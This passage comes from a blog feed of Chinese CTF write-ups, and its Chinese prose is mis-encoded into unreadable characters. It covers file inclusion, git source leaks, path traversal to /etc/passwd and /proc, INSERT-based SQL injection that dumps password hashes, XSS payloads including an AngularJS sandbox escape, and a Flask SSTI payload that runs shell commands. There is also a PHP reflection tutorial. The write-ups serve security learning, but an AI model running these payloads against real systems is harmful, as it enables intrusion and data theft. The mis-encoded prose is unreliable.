æ–¹å¼æ¥ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é˜²å¾¡é€»è¾‘(WAF)é˜²å¾¡ï¼š    ç›®å½•éåŽ†æ¼æ´žæ˜¯ä¸€ç§è·¨è¶Šç›®å½•è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†å½“PHPé…ç½®äº†open_basediræ—¶ï¼Œå°†å¾ˆå¥½åœ°ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å¾—è¿™ç§æ”»å‡»æ— æ•ˆã€‚    open_basedirçš„ä½œç”¨æ˜¯é™åˆ¶åœ¨æŸä¸ªç‰¹å®šç›®å½•ä¸‹PHPèƒ½æ‰“å¼€çš„æ–‡ä»¶(æœ‰ç‚¹åƒchrootçš„æ„Ÿè§‰)</code></pre><h4 id="4-é—®å·æˆªæ–­"><a href="#4-é—®å·æˆªæ–­" class="headerlink" title="4.é—®å·æˆªæ–­"></a>4.é—®å·æˆªæ–­</h4><pre><code>åˆ©ç”¨ï¼š    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?é˜²å¾¡ï¼š    å…³é—­è¿œç¨‹æ–‡ä»¶åŒ…å«çš„é…ç½®é€‰é¡¹allow_url_include = Off</code></pre><h3 id="é˜²å¾¡æ€»ç»“"><a href="#é˜²å¾¡æ€»ç»“" class="headerlink" title="é˜²å¾¡æ€»ç»“"></a>é˜²å¾¡æ€»ç»“</h3><pre><code>1.æ— éœ€æƒ…å†µä¸‹è®¾ç½®allow_url_includeå’Œallow_url_fopenä¸ºå…³é—­2.å¯¹å¯ä»¥åŒ…å«çš„æ–‡ä»¶è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨ç™½åå•çš„æ–¹å¼ï¼Œæˆ–è€…è®¾ç½®å¯ä»¥åŒ…å«çš„ç›®å½•ï¼Œå¦‚open_basedir3.å°½é‡ä¸ä½¿ç”¨åŠ¨æ€åŒ…å«4.ä¸¥æ ¼æ£€æŸ¥å˜é‡æ˜¯å¦å·²ç»åˆå§‹åŒ–ã€‚5.å»ºè®®å‡å®šæ‰€æœ‰è¾“å…¥éƒ½æ˜¯å¯ç–‘çš„ï¼Œå°è¯•å¯¹æ‰€æœ‰è¾“å…¥æäº¤å¯èƒ½å¯èƒ½åŒ…å«çš„æ–‡ä»¶åœ°å€ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶åŠè¿œç¨‹æ–‡ä»¶ï¼Œè¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå‚æ•°ä¸­ä¸å…è®¸å‡ºçŽ°../ä¹‹ç±»çš„ç›®å½•è·³è½¬ç¬¦ã€‚6.ä¸¥æ ¼æ£€æŸ¥includeç±»çš„æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­çš„å‚æ•°æ˜¯å¦å¤–ç•Œå¯æŽ§ã€‚7.ä¸è¦ä»…ä»…åœ¨å®¢æˆ·ç«¯åšæ•°æ®çš„éªŒè¯ä¸Žè¿‡æ»¤ï¼Œå…³é”®çš„è¿‡æ»¤æ­¥éª¤åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚8.åœ¨å‘å¸ƒåº”ç”¨ç¨‹åºä¹‹å‰æµ‹è¯•æ‰€æœ‰å·²çŸ¥çš„å¨èƒã€‚</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-HelloWorld</title>
      <link href="2021/05/19/i-chun-qiu-web-helloworld/"/>
      <url>2021/05/19/i-chun-qiu-web-helloworld/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.freesion.com/images/522/35569c24a4261ead1f06bac02613ff22.png" alt="1"></p><p>å­˜åœ¨.gitæºç æ³„éœ²æ¼æ´ž</p><p>git_extractæ‰«æ</p><p><img src="/2021/05/19/i-chun-qiu-web-helloworld/0dfe8fd56e7c7c21ac020942f1a6b7d.png" alt="0dfe8fd56e7c7c21ac020942f1a6b7d"></p><p><img src="/2021/05/19/i-chun-qiu-web-helloworld/9b14c5baec6fc17c25a290ec8e23502.png" alt="9b14c5baec6fc17c25a290ec8e23502"></p><p>æŠŠè¿™ä¸¤æ‹‰åˆ°beyond compareæ¯”è¾ƒï¼š</p><p><img src="/2021/05/19/i-chun-qiu-web-helloworld/444ef4ba783346a7c53ea45f728c4f5.png" alt="444ef4ba783346a7c53ea45f728c4f5"></p><p>ä¸ä¸€æ ·çš„åœ°æ–¹ä¸ºflagï¼š</p><pre><code>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-Blog</title>
      <link href="2021/05/18/i-chun-qiu-web-blog/"/>
      <url>2021/05/18/i-chun-qiu-web-blog/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/18/i-chun-qiu-web-blog/af732d2efa39b352f28282731713236.png" alt="af732d2efa39b352f28282731713236"></p><p><img src="/2021/05/18/i-chun-qiu-web-blog/2f76efeb2524974afe648a1e5273c0c.png" alt="2f76efeb2524974afe648a1e5273c0c"></p><p>å¾—åˆ°è·¯å¾„ï¼š  /kindeditor/php/upload_json.php</p><p> çŸ¥é“ç¼–è¾‘ç‰ˆä¸º kindeditorï¼Œæœç´¢ç›¸å…³æ¼æ´žï¼Œå¾—åˆ°åˆ©ç”¨</p><pre><code> /kindeditor/php/file_manager_json.php?path=/</code></pre><p>è®¿é—®ï¼š</p><pre><code>/kindeditor/php/file_manager_json.php?path=../../ </code></pre><p><img src="/2021/05/18/i-chun-qiu-web-blog/d879bbe9821057bd315346509fae17e.png" alt="d879bbe9821057bd315346509fae17e"></p><p>å°è¯•æ³¨å…¥ï¼š</p><pre><code>title=1' and '1'='1  è¿”å›ž1 </code></pre><pre><code>title=1' and '1'='2  è¿”å›ž0 </code></pre><p> äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªinsertæ³¨å…¥</p><p> insert into table(columns) values(A1,B1,C1)</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/05e4af14c2cb7fff3f502993faf7a5a.png" alt="05e4af14c2cb7fff3f502993faf7a5a"></p><pre><code>title=p1&amp;content=1','1'),('aaa',(database()),'1</code></pre><pre><code>title=p2&amp;content=1','1'),('aaa',(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),'2</code></pre><pre><code>title=p3&amp;content=1','1'),('aaa',(SELECT group_concat(column_name) from information_schema.columns where table_name='users'),'3</code></pre><pre><code>title=p4&amp;content=1','1'),('aaa',(SELECT group_concat(password) from users),'4</code></pre><p>ä¾æ¬¡å°è¯•ç»“æžœå¦‚ä¸‹ï¼š</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/bdb25940d7171a3b6273fc98dc56960.png" alt="bdb25940d7171a3b6273fc98dc56960"></p><ul><li>dbb616c5d935d8f34c12c291066d6fb7</li><li>202cb962ac59075b964b07152d234b70</li><li>250cf8b51c773f3f8dc8b4be867a9a02</li><li>68053af2923e00204c3ca7c6a3150cf7</li></ul><p>è§£å¯†ä¸ºï¼š melody123 123 456 789</p><p>è®¿é—®admin melody123</p><pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=article_manage&amp;name=php</code></pre><p>å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«</p><pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code></pre><p><img src="/2021/05/18/i-chun-qiu-web-blog/f7ec6bb8b94fba17307d1752a124d19.png" alt="f7ec6bb8b94fba17307d1752a124d19"></p><p>base64è§£ç å¾—åˆ°flag</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/2325cb6cebbefed58516c4d5d1b3e80.png" alt="2325cb6cebbefed58516c4d5d1b3e80"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹:Web-Upload</title>
      <link href="2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/"/>
      <url>2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹:Web-XSSé—¯å…³</title>
      <link href="2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/"/>
      <url>2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/1b8f9194262029569eac25fe2fe0bcd.png" alt="1b8f9194262029569eac25fe2fe0bcd"></p><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/e0418b3fd5c7ad3fceeea2e4c06b810.png" alt="e0418b3fd5c7ad3fceeea2e4c06b810"></p><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5c5d2b055ebae5b205942ee2992e8f6.png" alt="5c5d2b055ebae5b205942ee2992e8f6"></p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/c83f511820e7176ac807755a8c70e38.png" alt="c83f511820e7176ac807755a8c70e38"></p><pre><code>var username = â€˜â€™;alert('xss');//â€™;</code></pre><p>æ‰§è¡Œäº†alert</p><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/8ba7d443774282ea8d3a3fc3b02e0f8.png" alt="8ba7d443774282ea8d3a3fc3b02e0f8"></p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5fc4cc6b8c4229b90a8300982c3d9d0.png" alt="5fc4cc6b8c4229b90a8300982c3d9d0"></p><p>å•å¼•å·è¿‡æ»¤äº†é‚£ç”¨ä¸¤ä¸ªå•å¼•å·</p><pre><code>?username='';alert('xss');//</code></pre><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5575961a262d9b8a3a4edbdcb07c2aa.png" alt="5575961a262d9b8a3a4edbdcb07c2aa"></p><p> ä¼ªé“¾æŽ¥<br>javascript:alert(1)ï¼Œæµè§ˆå™¨ä¼šæŠŠjavascriptåŽé¢çš„é‚£ä¸€æ®µå†…å®¹å½“åšä»£ç ï¼Œç›´æŽ¥åœ¨å½“å‰é¡µé¢æ‰§è¡Œã€‚<br>ä»£ç ä¸­æŽ¥æ”¶jumpUrlä½œä¸ºè·³è½¬url</p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/c32728d41d44039d18259fd6c54d679.png" alt="c32728d41d44039d18259fd6c54d679"></p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/8a7efb956bb6903673491c4440755ab.png" alt="8a7efb956bb6903673491c4440755ab"></p><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><pre><code>if(getQueryVariable('autosubmit') !== false){      var autoForm = document.getElementById('autoForm');      autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');      autoForm.submit();     }else{     }  function getQueryVariable(variable)  {         var query = window.location.search.substring(1);         var vars = query.split("&amp;");         for (var i=0;i&lt;vars.length;i++) {                 var pair = vars[i].split("=");                 if(pair[0] == variable){return pair[1];}         }         return(false);  }</code></pre><pre><code>if(getQueryVariable('autosubmit') !== false){</code></pre><pre><code>autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');</code></pre><pre><code>?autosubmit=1&amp;action=javascript:alert('xss')</code></pre><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/9c572777f083d7436d1b86620dcc3e8.png" alt="9c572777f083d7436d1b86620dcc3e8"></p><h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/a0e9bd5e0f3c3cc909188f4ea275954.png" alt="a0e9bd5e0f3c3cc909188f4ea275954"></p><p>AngularJSæ¨¡æ¿</p><p><a href="https://nosec.org/home/detail/4153.html">https://nosec.org/home/detail/4153.html</a></p><p>Angularçš„æ²™ç®±é€ƒé€¸çš„æ–¹æ³•</p><p><a href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/6321c24a559b806668ac38fd69e126c.png" alt="6321c24a559b806668ac38fd69e126c"></p><h3 id="é€šå…³"><a href="#é€šå…³" class="headerlink" title="é€šå…³"></a>é€šå…³</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/2d695b34ea95b30bf5bd66088f4c9bc.png" alt="2d695b34ea95b30bf5bd66088f4c9bc"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP:é•œåƒåå°„</title>
      <link href="2021/05/15/php-jing-xiang-fan-she/"/>
      <url>2021/05/15/php-jing-xiang-fan-she/</url>
      
        <content type="html"><![CDATA[<h2 id="åå°„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#åå°„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="åå°„æ˜¯ä»€ä¹ˆï¼Ÿ"></a>åå°„æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>å®ƒæ˜¯æŒ‡åœ¨PHPè¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ‰©å±•åˆ†æžPHPç¨‹åºï¼Œå¯¼å‡ºæˆ–æå–å‡ºå…³äºŽç±»ã€æ–¹æ³•ã€å±žæ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚è¿™ç§åŠ¨æ€èŽ·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºåå°„APIã€‚åå°„æ˜¯æ“çºµé¢å‘å¯¹è±¡èŒƒåž‹ä¸­å…ƒæ¨¡åž‹çš„APIï¼Œå…¶åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå¯å¸®åŠ©æˆ‘ä»¬æž„å»ºå¤æ‚ï¼Œå¯æ‰©å±•çš„åº”ç”¨ã€‚</p><p>å…¶ç”¨é€”å¦‚ï¼šè‡ªåŠ¨åŠ è½½æ’ä»¶ï¼Œè‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£ï¼Œç”šè‡³å¯ç”¨æ¥æ‰©å……PHPè¯­è¨€ã€‚</p><p>PHPåå°„apiç”±è‹¥å¹²ç±»ç»„æˆï¼Œå¯å¸®åŠ©æˆ‘ä»¬ç”¨æ¥è®¿é—®ç¨‹åºçš„å…ƒæ•°æ®æˆ–è€…åŒç›¸å…³çš„æ³¨é‡Šäº¤äº’ã€‚å€ŸåŠ©åå°„æˆ‘ä»¬å¯ä»¥èŽ·å–è¯¸å¦‚ç±»å®žçŽ°äº†é‚£äº›æ–¹æ³•ï¼Œåˆ›å»ºä¸€ä¸ªç±»çš„å®žä¾‹ï¼ˆä¸åŒäºŽç”¨newåˆ›å»ºï¼‰ï¼Œè°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼ˆä¹Ÿä¸åŒäºŽå¸¸è§„è°ƒç”¨ï¼‰ï¼Œä¼ é€’å‚æ•°ï¼ŒåŠ¨æ€è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•ã€‚<br> åå°„apiæ˜¯PHPå†…å»ºçš„OOPæŠ€æœ¯æ‰©å±•ï¼ŒåŒ…æ‹¬ä¸€äº›ç±»ï¼Œå¼‚å¸¸å’ŒæŽ¥å£ï¼Œç»¼åˆä½¿ç”¨ä»–ä»¬å¯ç”¨æ¥å¸®åŠ©æˆ‘ä»¬åˆ†æžå…¶å®ƒç±»ï¼ŒæŽ¥å£ï¼Œæ–¹æ³•ï¼Œå±žæ€§ï¼Œæ–¹æ³•å’Œæ‰©å±•ã€‚è¿™äº›OOPæ‰©å±•è¢«ç§°ä¸ºåå°„ã€‚</p><p>å¹³å¸¸æˆ‘ä»¬ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ ReflectionClassç±» å’Œ ReflectionMethodç±»</p><pre><code>&lt;?phpclass Person { /**  * For the sake of demonstration, we"re setting this private  */ private $_allowDynamicAttributes = false; /**  * type=primary_autoincrement  */ protected $id = 0; /**  * type=varchar length=255 null  */ protected $name; /**  * type=text null  */ protected $biography; public function getId() {  return $this-&gt;id; } public function setId($v) {  $this-&gt;id = $v; } public function getName() {  return $this-&gt;name; } public function setName($v) {  $this-&gt;name = $v; } public function getBiography() {  return $this-&gt;biography; } public function setBiography($v) {  $this-&gt;biography = $v; }}</code></pre><p>ä¸€ã€é€šè¿‡ReflectionClassï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°Personç±»çš„ä»¥ä¸‹ä¿¡æ¯ï¼š</p><p>1.å¸¸é‡ Contants<br> 2.å±žæ€§ Property Names<br> 3.æ–¹æ³• Method Namesé™æ€<br> 4.å±žæ€§ Static Properties<br> 5.å‘½åç©ºé—´ Namespace<br> 6.Personç±»æ˜¯å¦ä¸ºfinalæˆ–è€…abstract<br> 7.Personç±»æ˜¯å¦æœ‰æŸä¸ªæ–¹æ³•</p><p>æŽ¥ä¸‹æ¥åå°„å®ƒï¼Œåªè¦æŠŠç±»åâ€Personâ€ä¼ é€’ç»™ReflectionClasså°±å¯ä»¥äº†ï¼š</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>$class = new ReflectionClass('Person'); // å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±»  $instance  = $class-&gt;newInstanceArgs($args); // ç›¸å½“äºŽå®žä¾‹åŒ–Person ç±» </code></pre><p>1ï¼‰èŽ·å–å±žæ€§(Properties)ï¼š</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>$properties = $class-&gt;getProperties();foreach ($properties as $property) { echo $property-&gt;getName() . "\n";}// è¾“å‡º:// _allowDynamicAttributes// id// name// biography</code></pre><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒReflectionClassä¼šèŽ·å–åˆ°æ‰€æœ‰çš„å±žæ€§ï¼Œprivate å’Œ protectedçš„ä¹Ÿå¯ä»¥ã€‚å¦‚æžœåªæƒ³èŽ·å–åˆ°privateå±žæ€§ï¼Œå°±è¦é¢å¤–ä¼ ä¸ªå‚æ•°ï¼š</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>$private_properties = $class-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</code></pre><p>å¯ç”¨å‚æ•°åˆ—è¡¨ï¼š</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>ReflectionProperty::IS_STATICReflectionProperty::IS_PUBLICReflectionProperty::IS_PROTECTEDReflectionProperty::IS_PRIVATE</code></pre><p>é€šè¿‡$property-&gt;getName()å¯ä»¥å¾—åˆ°å±žæ€§åã€‚</p><p>2ï¼‰èŽ·å–æ³¨é‡Šï¼š</p><p>é€šè¿‡getDocCommentå¯ä»¥å¾—åˆ°å†™ç»™propertyçš„æ³¨é‡Šã€‚</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>foreach ($properties as $property) { if ($property-&gt;isProtected()) {  $docblock = $property-&gt;getDocComment();  preg_match('/ type\=([a-z_]*) /', $property-&gt;getDocComment(), $matches);  echo $matches[1] . "\n"; }}// Output:// primary_autoincrement// varchar// text</code></pre><p>3ï¼‰èŽ·å–ç±»çš„æ–¹æ³•</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>getMethods()       æ¥èŽ·å–åˆ°ç±»çš„æ‰€æœ‰methodsã€‚hasMethod(string)  æ˜¯å¦å­˜åœ¨æŸä¸ªæ–¹æ³•getMethod(string)  èŽ·å–æ–¹æ³•</code></pre><p>4ï¼‰æ‰§è¡Œç±»çš„æ–¹æ³•ï¼š</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>$instance-&gt;getName(); // æ‰§è¡ŒPerson é‡Œçš„æ–¹æ³•getName// æˆ–è€…ï¼š$method = $class-&gt;getmethod('getName'); // èŽ·å–Person ç±»ä¸­çš„getNameæ–¹æ³•$method-&gt;invoke($instance);    // æ‰§è¡ŒgetName æ–¹æ³•// æˆ–è€…ï¼š$method = $class-&gt;getmethod('setName'); // èŽ·å–Person ç±»ä¸­çš„setNameæ–¹æ³•$method-&gt;invokeArgs($instance, array('snsgou.com'));</code></pre><p>äºŒã€é€šè¿‡ReflectionMethodï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°Personç±»çš„æŸä¸ªæ–¹æ³•çš„ä¿¡æ¯ï¼š</p><p>1.æ˜¯å¦â€œpublicâ€ã€â€œprotectedâ€ã€â€œprivateâ€ ã€â€œstaticâ€ç±»åž‹<br> 2.æ–¹æ³•çš„å‚æ•°åˆ—è¡¨<br> 3.æ–¹æ³•çš„å‚æ•°ä¸ªæ•°<br> 4.åè°ƒç”¨ç±»çš„æ–¹æ³•</p><p>ä»£ç å¦‚ä¸‹:</p><pre><code>// æ‰§è¡Œdetailæ–¹æ³•$method = new ReflectionMethod('Person', 'test');if ($method-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic()) { echo 'Action is right';}echo $method-&gt;getNumberOfParameters(); // å‚æ•°ä¸ªæ•°echo $method-&gt;getParameters(); // å‚æ•°å¯¹è±¡æ•°ç»„</code></pre><p><a href="https://blog.csdn.net/u013416034/article/details/105933637/">https://blog.csdn.net/u013416034/article/details/105933637/</a></p><p><a href="https://blog.csdn.net/luyaran/article/details/84339363">https://blog.csdn.net/luyaran/article/details/84339363</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»Ž0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹:Web-afr_3</title>
      <link href="2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/"/>
      <url>2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/</url>
      
        <content type="html"><![CDATA[<pre><code>article?name=../../../etc/passwd</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/dfafa81734822b8a4dead9370465497.png" alt="dfafa81734822b8a4dead9370465497"></p><pre><code>article?name=../../../flag</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/2c040ca57f1fa6cd98f6903789c6657.png" alt="2c040ca57f1fa6cd98f6903789c6657"></p><h4 id="Linuxå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æž-ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿ-proc-å¯¹-proc-self-cwdçš„è®¿é—®"><a href="#Linuxå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æž-ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿ-proc-å¯¹-proc-self-cwdçš„è®¿é—®" class="headerlink" title="Linuxå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æž-ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿ/proc-å¯¹/proc/self/cwdçš„è®¿é—®"></a>Linuxå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æž-ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿ/proc-å¯¹/proc/self/cwdçš„è®¿é—®</h4><ol><li><p>/proc/sched_debug # æä¾›cpuä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œå¯ä»¥èŽ·å¾—è¿›ç¨‹çš„pidå·ï¼Œå¯ä»¥é…åˆåŽé¢éœ€è¦pidçš„åˆ©ç”¨</p></li><li><p>/proc/mounts # æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨</p></li><li><p>/proc/net/arp # arpè¡¨ï¼Œå¯ä»¥èŽ·å¾—å†…ç½‘å…¶ä»–æœºå™¨çš„åœ°å€</p></li><li><p>/proc/net/route # è·¯ç”±è¡¨ä¿¡æ¯</p></li><li><p>/proc/net/tcp and /proc/net/udp # æ´»åŠ¨è¿žæŽ¥çš„ä¿¡æ¯</p></li><li><p>/proc/net/fib_trie # è·¯ç”±ç¼“å­˜</p></li><li><p>/proc/version  # å†…æ ¸ç‰ˆæœ¬</p></li><li><p>/proc/[PID]/cmdline # å¯èƒ½åŒ…å«æœ‰ç”¨çš„è·¯å¾„ä¿¡æ¯</p></li><li><p>/proc/[PID]/environ #  ç¨‹åºè¿è¡Œçš„çŽ¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥åŒ…å«getshell</p></li><li><p>/proc/[PID]/cwd     # å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•</p></li><li><p>/proc/[PID]/fd/[#] # è®¿é—®file descriptorsï¼ŒæŸå†™æƒ…å†µå¯ä»¥è¯»å–åˆ°è¿›ç¨‹æ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶ï¼Œæ¯”å¦‚access.log</p><pre><code>article?name=../../../proc/self/cmdline</code></pre></li></ol><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/8e57c316434afe29a6b114b857f3fe9.png" alt="8e57c316434afe29a6b114b857f3fe9"></p><pre><code>article?name=../../../proc/self/cwd/server.py</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/b0ea292d99ec5dca2dcc57cdc384634.png" alt="b0ea292d99ec5dca2dcc57cdc384634"></p><p>çœ‹åˆ°ä»£ç äº†ï¼š</p><pre><code>#!/usr/bin/pythonimport osfrom flask import (Flask, render_template, request, url_for, redirect, session, render_template_string)from flask_session import Sessionapp = Flask(__name__)execfile('flag.py')#execfile() å‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ã€‚execfile('key.py')FLAG = flagapp.secret_key = key @ app.route("/n1page", methods=["GET", "POST"])def n1page():    if request.method != "POST":        return redirect(url_for("index"))    n1code = request.form.get("n1code") or None    if n1code is not None: n1code = n1code.replace(".", "").replace("_", "").replace("{", "").replace("}", "")if "n1code" not in session or session['n1code'] is None: session['n1code'] = n1codetemplate = Noneif session[    'n1code'] is not None: template = '''&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class="row&gt; &lt;div class="col-md-6 col-md-offset-3 center"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; ''' %session['n1code']session['n1code'] = Nonereturn render_template_string(template) @ app.route("/", methods=["GET"])def index(): return render_template("main.html") @ app.route('/article', methods=['GET'])def article(): error = 0if 'name' in request.args:    page = request.args.get('name') else:    page = 'article'if page.find('flag') &gt;= 0: page = 'notallowed.txt'try:    template = open('/home/nu11111111l/articles/{}'.format(page)).read() except Exception as e:    template = ereturn render_template('article.html', template=template)if __name__ == "__main__": app.run(host='0.0.0.0', debug=False)</code></pre><pre><code>flagåœ¨flag.py(flagè¢«è¿‡æ»¤)flaskçš„appkeyåœ¨key.pyæºç é‡Œé¢å­˜åœ¨sstiï¼Œå‰ææ˜¯å¯ä»¥ä¼ªé€ flaskçš„session</code></pre><p>sstiæ³¨å…¥ï¼š</p><pre><code>{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/e5274968efa9a4310fbf7d679dab5ae.png" alt="e5274968efa9a4310fbf7d679dab5ae"></p><p>åŠ 